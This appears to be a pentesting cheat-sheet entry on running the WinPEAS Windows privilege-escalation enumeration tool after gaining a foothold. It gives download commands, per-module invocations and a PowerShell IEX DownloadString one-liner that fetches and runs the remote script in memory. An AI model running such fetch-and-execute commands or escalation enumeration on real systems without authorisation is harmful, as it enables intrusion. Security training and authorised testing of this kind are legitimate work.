# 09.06 WinPEAS

> Windows Privilege Escalation Audit Script — enumerates everything a Windows attacker cares about in one run.

## Overview

WinPEAS is a comprehensive Windows enumeration script. Color-coded output highlighting likely escalation paths: writable services, unquoted service paths, AlwaysInstallElevated, weak file permissions, registry autoruns, scheduled tasks, recently-modified files, credential leaks in disk/registry. Run after initial Windows foothold. Available as .bat, .exe, .ps1.

## Steps

- **Step 1** - Download winPEASany.exe from GitHub releases.
- **Step 2** - Transfer to target.
- **Step 3** - Run with desired modules (or 'all').
- **Step 4** - Review red/yellow highlights — those are likely escalation paths.

## Commands

### Get binary

```bash
# Latest release
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat
# PowerShell version
wget https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1
```

### Run all modules

```cmd
winPEASany.exe all
```

### Specific module

```cmd
winPEASany.exe systeminfo
winPEASany.exe servicesinfo
winPEASany.exe applicationsinfo
winPEASany.exe processinfo
winPEASany.exe networkinfo
winPEASany.exe userinfo
winPEASany.exe filesinfo
winPEASany.exe eventsinfo
winPEASany.exe registry
```

### Output to file (no color)

```cmd
winPEASany.exe all -nocolor > peas.txt
```

### PowerShell version

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')
Invoke-WinPEAS
```
